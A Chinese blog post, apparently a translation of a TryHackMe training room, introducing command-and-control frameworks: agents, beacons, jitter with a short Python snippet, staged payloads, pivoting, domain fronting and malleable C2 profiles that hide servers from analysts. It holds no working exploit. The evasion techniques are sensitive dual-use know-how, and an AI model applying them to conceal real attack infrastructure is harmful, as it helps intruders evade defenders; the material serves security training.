</head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://npm.elemecdn.com/anzhiyu-blog-static@1.0.4/img/avatar.jpg"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
  endLoading: () => {
    document.getElementById('loading-box').classList.add("loaded");
  },
  initLoading: () => {
    document.getElementById('loading-box').classList.remove("loaded")
  }
}
window.addEventListener('load',()=> { preloader.endLoading() })
setTimeout(function(){preloader.endLoading();},10000)

if (true) {
  document.addEventListener('pjax:send', () => { preloader.initLoading() })
  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><div class="back-home-button"><i class="anzhiyufont anzhiyu-icon-grip-vertical"></i><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="http://yansedaima.com/" title="颜色代码表"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121908150.svg" alt="颜色代码表"/><span class="back-menu-item-text">颜色代码表</span></a></div></div></div></div><a id="site-name" href="/" accesskey="h"><div class="title">hybcx</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-box-archive"></use></svg><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shapes"></use></svg><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-tags"></use></svg><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-link"></use></svg><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-artstation"></use></svg><span> 朋友圈</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-music"></use></svg><span> 音乐馆</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-paper-plane"></use></svg><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shoe-prints1"></use></svg><span> 随便逛逛</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><div class="nav-button" id="search-button"><a class="site-page social-icon search" href="javascript:void(0);" title="搜索🔍" accesskey="s"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span> 搜索</span></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" alt="微信" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" alt="支付宝" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/CTF%E8%B5%9B%E4%BA%8B/" style="font-size: 1.05rem;">CTF赛事<sup>18</sup></a><a href="/tags/CVE/" style="font-size: 1.05rem;">CVE<sup>15</sup></a><a href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 1.05rem;">Java反序列化<sup>3</sup></a><a href="/tags/Java%E5%9F%BA%E7%A1%80/" style="font-size: 1.05rem;">Java基础<sup>1</sup></a><a href="/tags/Linux%E6%8F%90%E6%9D%83/" style="font-size: 1.05rem;">Linux提权<sup>2</sup></a><a href="/tags/MISC/" style="font-size: 1.05rem;">MISC<sup>1</sup></a><a href="/tags/Metasploit/" style="font-size: 1.05rem;">Metasploit<sup>3</sup></a><a href="/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 1.05rem;">PHP代码审计<sup>2</sup></a><a href="/tags/SecBook/" style="font-size: 1.05rem;">SecBook<sup>1</sup></a><a href="/tags/TryHackMe/" style="font-size: 1.05rem;">TryHackMe<sup>42</sup></a><a href="/tags/Windows%E6%8F%90%E6%9D%83/" style="font-size: 1.05rem;">Windows提权<sup>2</sup></a><a href="/tags/reverse%E7%B3%BB%E5%88%97/" style="font-size: 1.05rem;">reverse系列<sup>2</sup></a><a href="/tags/tryhackme/" style="font-size: 1.05rem;">tryhackme<sup>1</sup></a><a href="/tags/web%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">web渗透<sup>2</sup></a><a href="/tags/web%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/" style="font-size: 1.05rem;">web知识总结<sup>2</sup></a><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 1.05rem;">代码审计<sup>1</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">内网渗透<sup>3</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/" style="font-size: 1.05rem;">内网靶场<sup>2</sup></a><a href="/tags/%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/" style="font-size: 1.05rem;">基本知识<sup>21</sup></a><a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" style="font-size: 1.05rem;">基础知识<sup>1</sup></a><a href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" style="font-size: 1.05rem;">攻防世界<sup>1</sup></a><a href="/tags/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA/" style="font-size: 1.05rem;">玄机应急响应靶场<sup>1</sup></a><a href="/tags/%E7%BA%A2%E9%98%9F%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">红队渗透<sup>1</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span><a class="card-more-btn" href="/archives/" title="查看更多">
    <i class="anzhiyufont anzhiyu-icon-angle-right"></i></a></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/08/"><span class="card-archive-list-date">八月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">12</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/07/"><span class="card-archive-list-date">七月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">16</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/06/"><span class="card-archive-list-date">六月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">9</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/05/"><span class="card-archive-list-date">五月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">7</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/04/"><span class="card-archive-list-date">四月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">5</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/03/"><span class="card-archive-list-date">三月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">18</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/02/"><span class="card-archive-list-date">二月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">12</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/01/"><span class="card-archive-list-date">一月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div><div class="console-btn-item" id="consoleMusic" onclick="anzhiyu.musicToggle()" title="音乐开关"><a class="music-switch"><i class="anzhiyufont anzhiyu-icon-music"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="post-meta-categories"><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/TryHackMe/" itemprop="url">TryHackMe</a></span><span class="article-meta tags"><a class="article-meta__tags" href="/tags/TryHackMe/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>TryHackMe</span></a></span></div></div><h1 class="post-title" itemprop="name headline">THM-C2简介</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2024-07-10T01:51:25.000Z" title="发表于 2024-07-10 09:51:25">2024-07-10</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2024-08-01T08:12:41.369Z" title="更新于 2024-08-01 16:12:41">2024-08-01</time></span></div><div class="meta-secondline"><span class="post-meta-separator"></span><span class="post-meta-wordcount"><i class="anzhiyufont anzhiyu-icon-file-word post-meta-icon" title="文章字数"></i><span class="post-meta-label" title="文章字数">字数总计:</span><span class="word-count" title="文章字数">10k</span><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-clock post-meta-icon" title="阅读时长"></i><span class="post-meta-label" title="阅读时长">阅读时长:</span><span>32分钟</span></span><span class="post-meta-separator"></span><span class="post-meta-pv-cv" id="" data-flag-title="THM-C2简介"><i class="anzhiyufont anzhiyu-icon-fw-eye post-meta-icon"></i><span class="post-meta-label" title="阅读量">阅读量:</span><span id="busuanzi_value_page_pv"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></span><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为太原"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>太原</span><span class="post-meta-separator"></span><span class="post-meta-commentcount"><i class="anzhiyufont anzhiyu-icon-comments post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/2024/07/10/thm-c2-jian-jie/#post-comment" itemprop="discussionUrl"><span class="valine-comment-count" data-xid="/2024/07/10/thm-c2-jian-jie/" itemprop="commentCount"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></a></span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src=""></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="http://hybcx.xyz/2024/07/10/thm-c2-jian-jie/"><header><a class="post-meta-categories" href="/categories/TryHackMe/" itemprop="url">TryHackMe</a><a href="/tags/TryHackMe/" tabindex="-1" itemprop="url">TryHackMe</a><h1 id="CrawlerTitle" itemprop="name headline">THM-C2简介</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">hybcx</span><time itemprop="dateCreated datePublished" datetime="2024-07-10T01:51:25.000Z" title="发表于 2024-07-10 09:51:25">2024-07-10</time><time itemprop="dateCreated datePublished" datetime="2024-08-01T08:12:41.369Z" title="更新于 2024-08-01 16:12:41">2024-08-01</time></header><h1 id="0x01-介绍">0x01 介绍</h1>
<h2 id="欢迎来到-c2-简介">欢迎来到 C2 简介</h2>
<p>命令与控制 (C2) 框架是红队和高级对手手册的重要组成部分。它们不仅可以在交战期间轻松管理受损设备，而且通常有助于横向移动。</p>
<h2 id="room-objectives-房间目标">Room Objectives 房间目标</h2>
<p>在这个房间中，我们将深入了解命令和控制框架，以便更好地理解以下主题：</p>
<ul>
<li>命令和控制框架如何运作</li>
<li>您可能使用的各种组件。</li>
<li>如何建立基本的命令和控制框架</li>
<li>使用 Armitage 或 Metasploit 熟悉命令和控制框架</li>
<li>如何管理命令和控制框架</li>
<li>管理命令和控制框架时的 OPSEC 注意事项</li>
<li>以及更多！</li>
</ul>
<h2 id="房间先决条件">房间先决条件</h2>
<ul>
<li>Metasploit 框架的一般经验，有关更多信息，请参阅 <a target="_blank" rel="noopener" href="https://tryhackme.com/module/metasploit">Metasploit</a> 模块。</li>
<li>对红队的总体熟悉；有关更多信息，请<a target="_blank" rel="noopener" href="https://tryhackme.com/room/redteamfundamentals">参阅红队基础知识室</a>。</li>
<li>一般熟悉利用易受攻击的虚拟机。</li>
</ul>
<h1 id="0x02-c2框架">0x02 C2框架</h1>
<h2 id="什么是c2框架">什么是C2框架</h2>
<p>在尝试消化 C2 框架的各个组件时，它可能会令人生畏。然而，它们不一定是这样。为了更好地理解 C2 框架最基本的含义，请考虑一个 Netcat 侦听器（C2 服务器），它能够同时处理多个反向 shell 回调（C2 代理）。它是一个服务器，但用于反向 shell。与 Netcat 不同，几乎所有 C2 框架都需要特殊的有效负载生成器。这通常是框架本身内置的功能。例如，Metasploit 是一个 C2 框架，有自己的有效负载生成器 MSFVenom。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407101948394.png" alt="image-20240710101214445"></p>
<p>那么到底是什么让 C2 框架比普通的 Netcat 监听器更好呢？似乎有人需要做的就是在 Netcat 中实现会话管理，你也有同样的事情吗？虽然这是事实，但 C2 框架的亮点在于其“后利用”功能。</p>
<h2 id="c2结构">C2结构</h2>
<h3 id="c2-server">C2 Server</h3>
<p>为了理解命令和控制框架，我们必须首先了解 C2 服务器的各个组件。让我们从最基本的组件开始——C2 服务器本身。 C2 服务器充当客服人员回拨的中心。特工将定期联系 C2 服务器并等待操作员的命令。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407101948395.png" alt="image-20240710101355666"></p>
<h3 id="agents-payloads">Agents / Payloads</h3>
<p>代理是由 C2 框架生成的程序，用于回调 C2 服务器上的侦听器。大多数时候，与标准反向 shell 相比，该代理可以实现特殊功能。大多数 C2 框架都实现伪命令，以使 C2 操作员的工作更轻松。这方面的一些示例可能是用于将文件下载或上传到系统的伪命令。重要的是要知道代理可以高度可配置，可以调整 C2 代理向 C2 服务器上的侦听器发送信标的频率等等。</p>
<h3 id="listeners">Listeners</h3>
<p>在最基本的层面上，侦听器是在 C2 服务器上运行的应用程序，等待通过特定端口或协议的回调。其中一些示例包括 DNS、HTTP 和/或 HTTPS。</p>
<h3 id="beacons">Beacons</h3>
<p>Beacon 是 C2 代理回调运行在 C2 服务器上的侦听器的过程。</p>
<h2 id="混淆代理回调">混淆代理回调</h2>
<h3 id="sleep-timers">Sleep Timers</h3>
<p>一些安全分析师、防病毒软件和下一代防火墙在尝试识别命令和控制流量时寻找的一项关键内容是beacon以及设备向 C2 服务器发出信标的速率。假设防火墙观察到的流量如下所示</p>
<ul>
<li>TCP/443 - Session Duration 3s, 55 packets sent, 10:00:05.000</li>
<li>TCP/443 - Session Duration 2s, 33 packets sent, 10:00:10.000</li>
<li>TCP/443 - Session Duration 3s, 55 packets sent, 10:00:15.000</li>
<li>TCP/443 - Session Duration 1s, 33 packets sent, 10:00:20.000</li>
<li>TCP/443 - Session Duration 3s, 55 packets sent, 10:00:25.000</li>
</ul>
<p>一种模式正在开始形成。代理每 5 秒发出一次信标；这意味着它有一个 5 秒的睡眠定时器。</p>
<h3 id="jitter">Jitter</h3>
<p>Jitter采用睡眠计时器并为其添加一些变化；我们的 C2 信标现在可能会表现出一种奇怪的模式，可能显示出更接近普通用户的活动：</p>
<ul>
<li>TCP/443 - Session Duration 3s, 55 packets sent, 10:00:03.580</li>
<li>TCP/443 - Session Duration 2s, 33 packets sent, 10:00:13.213</li>
<li>TCP/443 - Session Duration 3s, 55 packets sent, 10:00:14.912</li>
<li>TCP/443 - Session Duration 1s, 33 packets sent, 10:00:23.444</li>
<li>TCP/443 - Session Duration 3s, 55 packets sent, 10:00:27.182</li>
</ul>
<p>beaconing现在设置为半不规则模式，这使得在常规用户流量中识别起来稍微困难一些。在更高级的 C2 框架中，可以更改各种其他参数，例如“文件”抖动或向payload添加垃圾数据或让正在传输的文件使其看起来比实际上更大。</p>
<p>Jitter 的示例 Python3 代码可能如下所示：</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> random

sleep = <span class="hljs-number">60</span>
jitter = random.randint(-<span class="hljs-number">30</span>,<span class="hljs-number">30</span>)
sleep = sleep + jitter</code></pre>
<p>值得注意的是，这是一个基本的示例，但它可能需要更多的数学知识，设置上限和下限，获取上次睡眠的百分比，并在此基础上进行构建。因为这是一个介绍室，所以我们不会为您提供复杂的公式。</p>
<h2 id="payload-类型">Payload 类型</h2>
<p>与常规反向 Shell 非常相似，您可以在 C2 框架中使用两种主要类型的有效负载：分阶段和无阶段有效负载。</p>
<h3 id="stageless-payloads">Stageless Payloads</h3>
<p>无阶段有效负载是两者中最简单的；它们包含完整的 C2 代理，并将回调 C2 服务器并立即开始设置信标。您可以参考下图以更好地了解无级有效负载的运行方式。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407101948396.png" alt="image-20240710104911156"></p>
<p>使用 Stageless 有效负载建立 C2 信标的步骤如下：</p>
<ol>
<li>
<p>受害者下载并执行Dropper</p>
</li>
<li>
<p>开始向 C2 服务器发送信标</p>
</li>
</ol>
<h3 id="staged-payloads">Staged Payloads</h3>
<p>分阶段的有效负载需要回调 C2 服务器来下载 C2 代理的其他部分。这通常被称为“Dropper”，因为它被“投放”到受害者计算机上以下载我们暂存有效负载的第二阶段。这是优于无级有效负载的首选方法，因为需要编写少量代码来从 C2 服务器检索 C2 代理的附加部分。它还可以更轻松地混淆代码以绕过防病毒程序。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407101948397.png" alt="image-20240710105106362"></p>
<p>使用暂存有效负载建立 C2 信标的步骤如下：</p>
<ol>
<li>
<p>受害者下载并执行Dropper</p>
</li>
<li>
<p>Dropper回调C2服务器进行第2阶段</p>
</li>
<li>
<p>C2服务器将阶段2发送回受害者工作站</p>
</li>
<li>
<p>第 2 阶段被加载到受害者工作站的内存中</p>
</li>
<li>
<p>C2 信标初始化，红队成员/威胁参与者可以与 C2 服务器上的受害者进行交互。</p>
</li>
</ol>
<h3 id="payload-formats-有效负载格式">Payload Formats 有效负载格式</h3>
<p>您可能知道，Windows PE 文件（可执行文件）并不是在系统上执行代码的唯一方式。一些 C2 框架支持各种其他格式的有效负载，例如：</p>
<ul>
<li>PowerShell 脚本
<ul>
<li>其中可能包含 C# 代码，并且可以使用 Add-Type commandlet 进行编译和执行</li>
</ul>
</li>
<li>HTA Files HTA 文件</li>
<li>JScript Files JScript 文件</li>
<li>Visual Basic Application/Scripts<br>
Visual Basic 应用程序/脚本</li>
<li>Microsoft Office Documents<br>
微软办公文档</li>
</ul>
<p>还有很多。有关各种其他有效负载格式的更多信息，您应该查看初始访问模块中的<a target="_blank" rel="noopener" href="https://tryhackme.com/room/weaponization">武器化室</a>。</p>
<h3 id="modules">Modules</h3>
<p>模块是任何 C2 框架的核心组件；它们增加了使代理和 C2 服务器更加灵活的能力。根据 C2 框架，脚本必须用不同的语言编写。 Cobalt Strike 有“Aggressor Scripts”，它是用“Aggressor Scripting Language”编写的。 PowerShell Empire 支持多种语言，Metasploit 的模块是用 Ruby 编写的，还有许多其他模块是用许多其他语言编写的。</p>
<h3 id="post-exploitation-modules">Post Exploitation Modules</h3>
<p>后利用模块只是处理初始妥协点之后的任何事情的模块，这可能像运行 SharpHound.ps1 来查找横向移动路径一样简单，也可能像转储 LSASS 和在内存中解析凭据一样复杂。有关 Post Exploitation 的更多信息，请参阅 <a target="_blank" rel="noopener" href="https://tryhackme.com/room/postexploit">Post Exploitation</a> 基础知识室。</p>
<h3 id="pivoting-modules">Pivoting Modules</h3>
<p>C2 框架的最后一个主要组件之一是其旋转模块，可以更轻松地访问 C2 框架内的受限网络段。如果您在系统上具有管理访问权限，则可以打开“SMB 信标”，它可以使计算机通过 SMB 协议充当代理。这可能允许受限网段中的计算机与您的 C2 服务器进行通信。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407101948398.png" alt="image-20240710105612214"></p>
<p>上图展示了受限网段内的主机如何回调C2服务器：</p>
<ol>
<li>受害者回调非限制网段中另一个受害者上的 SMB 命名管道。</li>
<li>非限制网段中的受害者通过标准信标回呼C2服务器。</li>
<li>然后，C2 服务器将命令发送回非限制网段中的受害者。</li>
<li>然后，非限制网段中的受害者将 C2 指令转发到限制网段中的主机。</li>
</ol>
<h2 id="facing-the-world">Facing the world</h2>
<p>所有红队成员必须克服的一个重要障碍是将基础设施置于清晰可见的位置。有许多不同的方法可以做到这一点；最流行的方法之一称为“域名前置”。</p>
<h3 id="domain-fronting">Domain Fronting</h3>
<p>域前端使用已知的良好主机（例如 Cloudflare）。 Cloudflare 经营的业务提供有关 HTTP 连接详细信息的增强指标以及缓存 HTTP 连接请求以节省带宽。红队成员可以滥用此功能，使工作站或服务器看起来正在与已知的可信 IP 地址进行通信。地理位置结果将显示最近的 Cloudflare 服务器所在位置，并且 IP 地址将显示为 Cloudflare 的所有权。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407101948399.png" alt="image-20240710110019114"></p>
<p>上图描述了域前置的工作原理：</p>
<ol>
<li>
<p>C2 运营商拥有一个通过 Cloudflare 代理所有请求的域。</p>
</li>
<li>
<p>受害者向 C2 域发送信标。</p>
</li>
<li>
<p>Cloudflare 代理请求，然后查看 Host 标头并将流量中继到正确的服务器。</p>
</li>
<li>
<p>然后，C2 服务器使用 C2 命令响应 Cloudflare。</p>
</li>
<li>
<p>然后受害者收到来自 Cloudflare 的命令。</p>
</li>
</ol>
<h3 id="c2-配置">C2 配置</h3>
<p>下一个技术有几个不同产品的多个名称，“NGINX 反向代理”、“Apache Mod_Proxy/Mod_Rewrite”、“Malleable HTTP C2 Profiles”等等。然而，它们或多或少都是相同的。所有代理功能或多或少允许用户控制传入 HTTP 请求的特定元素。假设传入的连接请求具有“X-C2-Server”标头；我们可以使用您可以使用的特定技术（反向代理、Mod_Proxy/Rewrite、Malleable C2 Profile 等）显式提取此标头，并确保您的 C2 服务器使用基于 C2 的响应进行响应。而如果普通用户查询 HTTP 服务器，他们可能会看到一个通用网页。这完全取决于您的配置。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407101948400.png" alt="image-20240710110309350"></p>
<p>上图描述了 C2 配置文件的工作原理：</p>
<ol>
<li>
<p>受害者通过 HTTP 请求中的自定义标头向 C2 服务器发出信标，而 SOC 分析师则具有正常的 HTTP 请求</p>
</li>
<li>
<p>请求通过 Cloudflare 代理</p>
</li>
<li>
<p>C2 Server 接收请求并查找自定义标头，然后根据 C2 Profile 评估如何响应。</p>
</li>
<li>
<p>C2 服务器响应客户端并响应分析人员/受感染设备。</p>
</li>
</ol>
<p>由于 HTTPS 请求已加密，因此可能无法提取特定标头（例如：X-C2-Server 或 Host）。通过使用 C2 配置文件，我们也许能够隐藏我们的 C2 服务器，防止安全分析师的窥探。有关 C2 型材如何强大的更多信息，请参阅这篇关于了解 Cobalt Strike 的可延展 C2 型材的<a target="_blank" rel="noopener" href="https://blog.zsec.uk/cobalt-strike-profiles/">博客文章</a>。</p>
